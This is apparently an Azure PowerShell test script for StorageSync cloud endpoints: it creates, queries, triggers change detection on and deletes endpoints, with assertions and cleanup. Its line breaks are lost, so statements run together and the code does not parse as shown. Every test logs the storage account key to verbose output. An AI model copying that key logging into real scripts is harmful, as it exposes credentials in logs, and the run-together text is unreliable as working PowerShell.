function Test-CloudEndpoint{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Trigger change detection by Name"Invoke-AzStorageSyncChangeDetection -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName  $syncGroupName -Name $CloudEndpointName -DirectoryPath "" -AsJob | Wait-JobWrite-Verbose "Trigger change detection by InputObject"Invoke-AzStorageSyncChangeDetection -InputObject $cloudEndpoint -DirectoryPath "" -AsJob | Wait-JobWrite-Verbose "Trigger change detection by ResourceId"Invoke-AzStorageSyncChangeDetection -ResourceId $cloudEndpoint.ResourceId  -DirectoryPath "" -AsJob | Wait-JobWrite-Verbose "Trigger change detection by ResourceId, with Recursive"Invoke-AzStorageSyncChangeDetection -ResourceId $cloudEndpoint.ResourceId  -DirectoryPath "" -Recursive -AsJob | Wait-JobWrite-Verbose "Trigger change detection by ResourceId, with Path"Invoke-AzStorageSyncChangeDetection -ResourceId $cloudEndpoint.ResourceId  -Path "a","b","c" -AsJob | Wait-JobWrite-Verbose "Get CloudEndpoint by Name"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -CloudEndpointName $cloudEndpointName Write-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by ParentObject"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ParentObject $syncGroup -Name $cloudEndpointName -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by ParentResourceId"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ParentResourceId $syncGroup.ResourceId -Name $cloudEndpointName -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Executing Piping Scenarios"New-AzStorageSyncCloudEndpoint -ParentObject $syncGroup -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId | Remove-AzStorageSyncCloudEndpoint -Force -AsJob | Wait-JobNew-AzStorageSyncCloudEndpoint -ParentResourceId $syncGroup.ResourceId -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId | Remove-AzStorageSyncCloudEndpoint -Force -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-NewCloudEndpoint{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetCloudEndpoint{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by Name"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -CloudEndpointName $cloudEndpointName Write-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetCloudEndpoints{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by SyncGroup"$cloudEndpoints = Get-AzStorageSyncCloudEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupNameAssert-AreEqual $cloudEndpoints.Length 1$cloudEndpoint = $cloudEndpoints[0]Write-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetCloudEndpointParentObject{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by ParentObject"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ParentObject $syncGroup -Name $cloudEndpointName -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetCloudEndpointParentResourceId{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by ParentResourceId"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ParentResourceId $syncGroup.ResourceId -Name $cloudEndpointName -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $StorageAccount.Id $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveCloudEndpoint{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$AzureFileShareName = "testfs" $StorageAccountName = Get-ResourceName("sa")$StorageAccountTenantId = (Get-AzTenant).IdWrite-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountNameWrite-Verbose "Resource: $StorageAccountName | Key: $($key[0])" $context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$cloudEndpoint = New-AzStorageSyncCloudEndpoint -ResourceGroupName $syncGroup.ResourceGroupName  -StorageSyncServiceName $syncGroup.StorageSyncServiceName -SyncGroupName $syncGroup.SyncGroupName -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -VerboseWrite-Verbose "Validating CloudEndpoint Properties"Assert-AreEqual $cloudEndpointName $cloudEndpoint.CloudEndpointNameAssert-AreEqual $storageAccountResourceId $cloudEndpoint.StorageAccountResourceIdAssert-AreEqual $StorageAccountTenantId $cloudEndpoint.StorageAccountTenantIdWrite-Verbose "Get CloudEndpoint by Name"$cloudEndpoint = Get-AzStorageSyncCloudEndpoint -ResourceGroupName 